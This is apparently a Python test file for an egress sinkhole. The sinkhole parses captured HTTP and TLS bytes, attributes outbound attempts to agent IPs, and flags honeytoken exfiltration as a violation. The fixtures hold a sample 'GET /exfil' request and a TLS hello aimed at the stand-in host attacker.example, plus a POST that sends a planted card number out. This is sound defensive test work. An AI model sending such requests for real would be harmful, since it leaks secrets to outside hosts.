"""Sinkhole parsing on captured bytes and attribution (ADR-0035). No network beyond loopback."""

import contextlib
import ssl
from datetime import UTC, datetime

import anyio
from anyio.abc import SocketAttribute, SocketStream

from bourse.contracts.trust import ViolationReport
from bourse.egress.sinkhole import EGRESS_ATTEMPT, EXFIL, Sinkhole, parse_http, parse_sni
from bourse.trust.honeytokens import Honeytoken, InMemoryHoneytokenRepository, derive
from bourse.trust.repo import InMemoryEgressRepository

AGENT_IP = "172.30.55.51"
AGENT_ID = "vendor-a-profiler@vendor-a.local"
PROBE_IP = "172.30.55.70"
HTTP_REQ = (
    b"GET /exfil?probe=1 HTTP/1.1\r\nHost: attacker.example\r\nUser-Agent: curl/8.5.0\r\n"
    b"Accept: */*\r\n\r\n"
)


def client_hello(server_name: str) -> bytes:
    """A real TLS ClientHello produced in memory by the ssl module."""
    ctx = ssl.create_default_context()
    incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
    tls = ctx.wrap_bio(incoming, outgoing, server_hostname=server_name)
    with contextlib.suppress(ssl.SSLWantReadError):
        tls.do_handshake()
    return outgoing.read()


def test_parse_http() -> None:
    head = parse_http(HTTP_REQ)
    assert head is not None
    assert (head.method, head.path, head.host) == ("GET", "/exfil?probe=1", "attacker.example")
    assert parse_http(b"\x16\x03\x01garbage") is None


def test_parse_sni_from_real_client_hello() -> None:
    hello = client_hello("attacker.example")
    assert hello[0] == 0x16
    assert parse_sni(hello) == "attacker.example"
    assert parse_sni(HTTP_REQ) is None
    assert parse_sni(hello[:20]) is None  # truncated


def make_sinkhole() -> tuple[
    Sinkhole,
    InMemoryEgressRepository,
    list[tuple[str, ViolationReport]],
    InMemoryHoneytokenRepository,
]:
    repo = InMemoryEgressRepository()
    tokens = InMemoryHoneytokenRepository()
    reported: list[tuple[str, ViolationReport]] = []

    async def report(agent_id: str, v: ViolationReport) -> None:
        reported.append((agent_id, v))

    sinkhole = Sinkhole(
        identities={AGENT_IP: AGENT_ID, PROBE_IP: "egress-probe"},
        agent_ips={AGENT_IP: AGENT_ID},
        repo=repo,
        tokens=tokens,
        report=report,
    )
    return sinkhole, repo, reported, tokens


async def test_agent_egress_is_attributed_and_reported() -> None:
    sinkhole, repo, reported, _ = make_sinkhole()
    event = await sinkhole.record(AGENT_IP, 80, HTTP_REQ)
    assert (event.agent_id, event.host, event.port, event.bytes) == (
        AGENT_ID,
        "attacker.example",
        80,
        len(HTTP_REQ),
    )
    assert event.honeytoken_hits == 0
    assert [(a, v.kind, v.severity.value) for a, v in reported] == [
        (AGENT_ID, EGRESS_ATTEMPT, "HARD")
    ]
    tls = await sinkhole.record(AGENT_IP, 443, client_hello("attacker.example"))
    assert tls.host == "attacker.example"
    assert len(repo.events) == 2


async def test_honeytoken_in_payload_is_exfil() -> None:
    sinkhole, _, reported, tokens = make_sinkhole()
    t = derive(b"s", "run-1:pii:1")
    await tokens.add_token(
        Honeytoken(task_id="run-1:pii:1", card=t.card, email=t.email, at=datetime.now(UTC))
    )
    payload = b"POST /c HTTP/1.1\r\nHost: x.example\r\n\r\ncard=" + t.card.encode()
    event = await sinkhole.record(AGENT_IP, 80, payload)
    assert event.honeytoken_hits == 1
    assert [v.kind for _, v in reported] == [EGRESS_ATTEMPT, EXFIL]


async def test_non_agent_ips_recorded_without_violation() -> None:
    sinkhole, repo, reported, _ = make_sinkhole()
    probe = await sinkhole.record(PROBE_IP, 80, HTTP_REQ)
    unknown = await sinkhole.record("10.9.9.9", 443, b"")
    assert probe.agent_id == "egress-probe" and unknown.agent_id is None
    assert reported == []
    assert len(repo.events) == 2


async def test_http_listener_answers_403_and_records() -> None:
    sinkhole, repo, _, _ = make_sinkhole()
    listener = await anyio.create_tcp_listener(local_host="127.0.0.1", local_port=0)
    port = listener.extra(SocketAttribute.local_port)

    async def handler(stream: SocketStream) -> None:
        await sinkhole.handle(stream, 80)

    async with anyio.create_task_group() as tg:
        tg.start_soon(listener.serve, handler)
        async with await anyio.connect_tcp("127.0.0.1", port) as client:
            await client.send(HTTP_REQ)
            reply = await client.receive()
        tg.cancel_scope.cancel()
    assert reply.startswith(b"HTTP/1.1 403")
    assert [(e.src_ip, e.host) for e in repo.events] == [("127.0.0.1", "attacker.example")]
